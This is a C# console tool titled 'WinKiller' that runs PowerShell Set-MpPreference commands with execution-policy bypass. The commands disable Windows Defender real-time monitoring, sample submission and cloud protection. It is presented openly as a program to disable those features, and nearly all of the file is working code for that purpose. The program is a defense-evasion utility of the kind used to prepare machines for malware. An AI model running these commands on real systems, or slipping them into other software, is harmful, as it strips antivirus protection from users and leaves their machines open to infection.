using System;
using System.Diagnostics;
using System.Threading;

class Program
{
    static void Main()
    {
        // Specify the PowerShell commands to disable Windows Defender features
        string[] powershellCommands = {
            "Set-MpPreference -DisableRealtimeMonitoring $true",          // Disable Real-time Protection
            "Set-MpPreference -SubmitSamplesConsent NeverSend",           // Disable Automatic Sample Submission
            "Set-MpPreference -MAPSReporting Disable"                     // Disable Cloud-Based Protection
        };
        Console.ForegroundColor = ConsoleColor.Red; // Set text color to light blue

        Console.WriteLine(" __          ___       _  ___ _ _           ");
        Console.WriteLine(" \\ \\        / (_)     | |/ (_) | |          ");
        Console.WriteLine("  \\ \\  /\\  / / _ _ __ | ' / _| | | ___ _ __ ");
        Console.WriteLine("   \\ \\/  \\/ / | | '_ \\|  < | | | |/ _ \\ '__|");
        Console.WriteLine("    \\  /\\  /  | | | | | . \\| | | |  __/ |   ");
        Console.WriteLine("     \\/  \\/   |_|_| |_|_|\\_\\_|_|_|\\___|_|   ");
        Console.WriteLine();

        Console.ForegroundColor = ConsoleColor.White; // Reset text color to white

        Console.WriteLine("\n");

        note("This program will disable Windows Defender features.\n");

        note("Press any key to proceed.");
        Console.ReadKey();
        Console.Beep(500, 500);
        System.Threading.Thread.Sleep(1000);
        // Run PowerShell commands as administrator and display the output
        RunElevatedPowerShellCommands(powershellCommands);

        sux("Press any key to exit.");
        Console.ReadKey();
    }

    static void Error(string arg)
    {
        Console.Write("    [");
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.Write("+");
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write("] ");
        Console.WriteLine(arg);
    }

    static void note(string arg)
    {
        Console.Write("    [");
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.Write(">");
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write("] ");
        Console.WriteLine(arg);
    }


    static void sux(string arg)
    {
        Console.Write("    [");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write("+");
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write("] ");
        Console.WriteLine(arg);
    }

    static void RunElevatedPowerShellCommands(string[] commands)
    {
        foreach (var command in commands)
        {
            // Start a new PowerShell process with elevated privileges
            using (Process PowerShellProcess = new Process())
            {
                PowerShellProcess.StartInfo.FileName = "powershell.exe";
                PowerShellProcess.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"";
                PowerShellProcess.StartInfo.RedirectStandardOutput = true;
                PowerShellProcess.StartInfo.RedirectStandardError = true;
                PowerShellProcess.StartInfo.UseShellExecute = false;
                PowerShellProcess.StartInfo.CreateNoWindow = true;
                PowerShellProcess.StartInfo.Verb = "runas"; // Run as administrator

                PowerShellProcess.Start();

                // Display the output
                sux($"Disabling Protection !");
                sux("Output:");
                //sux(PowerShellProcess.StandardOutput.ReadToEnd());

                // Display any errors
                Error("Errors:");
                //Error(PowerShellProcess.StandardError.ReadToEnd());

                PowerShellProcess.WaitForExit();
            }

            // Add a newline for better readability
            Console.WriteLine();
        }
    }
}
